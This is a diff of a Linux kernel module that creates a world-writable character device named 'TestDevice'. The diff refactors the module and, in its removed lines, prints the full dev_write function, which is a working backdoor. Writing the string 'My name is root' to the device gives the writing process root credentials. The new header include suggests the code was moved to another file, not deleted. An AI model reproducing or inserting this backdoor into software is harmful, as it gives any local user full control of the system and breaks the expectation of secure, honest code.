@@ -10,24 +10,14 @@
 #include <linux/types.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
+#include "file-operations.h"
 
 MODULE_LICENSE("GPL");
 
 #define DEVICE_NAME "TestDevice"  // name--> appears in /proc/devices
 #define CLASS_NAME "Test"         ///< The device class
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
-#define V(x) x.val
-#else
-#define V(x) x
-#endif
-
-static int     dev_open(struct inode *, struct file *);
-static int     dev_release(struct inode *, struct file *);
-static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
-static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);
-
-static int uevent(struct device *dev, struct kobj_uevent_env *env){
+static int uevent(struct device *dev, struct kobj_uevent_env *env) {
   add_uevent_var(env, "DEVMODE=%#o", 0666);
   return 0;
 }
@@ -38,6 +28,7 @@ static struct file_operations fops = {
     .write   = dev_write,
     .release = dev_release,
 };
+
 static struct device *cdevice = NULL;
 struct class *        devClass;
 struct cdev *         mcdev;
@@ -51,10 +42,10 @@ static int __init test_init(void) {
   ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
 
   // Create a class which will appear at /sys/class
-  devClass = class_create(THIS_MODULE, CLASS_NAME);
+  devClass             = class_create(THIS_MODULE, CLASS_NAME);
   devClass->dev_uevent = uevent;
-  
-  cdevice  = device_create(devClass, NULL, dev_num, NULL, DEVICE_NAME);
+
+  cdevice = device_create(devClass, NULL, dev_num, NULL, DEVICE_NAME);
 
   if (ret < 0) {
     printk(KERN_ALERT "Load failed\n");
@@ -88,59 +79,6 @@ static void __exit test_exit(void) {
   class_destroy(devClass);
   unregister_chrdev_region(dev_num, 1);
   printk(KERN_INFO "Module has been unloaded\n");
-}
-
-static int dev_open(struct inode *inodep, struct file *filep) {
-  printk(KERN_INFO "Device opened\n");
-  return 0;
-}
-
-static ssize_t dev_write(struct file *filep,
-                         const char __user *buf,
-                         size_t             len,
-                         loff_t *           offset) {
-  
-  char *       data;
-  char         magic[] = "My name is root";
-  struct cred *new_cred;
-
-  data = (char *)kmalloc(len + 1, GFP_KERNEL);
-  if (data) {
-    copy_from_user(data, buf, len);
-    if (memcmp(data, magic, 15) == 0) {
-      if ((new_cred = prepare_creds()) == NULL) {
-        printk("TEST: Cannot prepare credentials\n");
-        return 0;
-      }
-
-      printk("TEST: Credentials prepared!");
-      V(new_cred->uid) = V(new_cred->gid) = 0;
-      V(new_cred->euid) = V(new_cred->egid) = 0;
-      V(new_cred->suid) = V(new_cred->sgid) = 0;
-      V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
-      commit_creds(new_cred);
-    }
-    kfree(data);
-  }
-  return len;
-}
-
-static int dev_release(struct inode *inodep, struct file *filep) {
-  printk(KERN_INFO "Device closed\n");
-  return 0;
-}
-
-static ssize_t dev_read(struct file *filep,
-                        char *       buffer,
-                        size_t       len,
-                        loff_t *     offset) {
-  int   errors      = 0;
-  char *message     = "Oh yeah, read my device...";
-  int   message_len = strlen(message);
-
-  errors = copy_to_user(buffer, message, message_len);
-
-  return errors == 0 ? message_len : -EFAULT;
 }
 
 module_init(test_init);
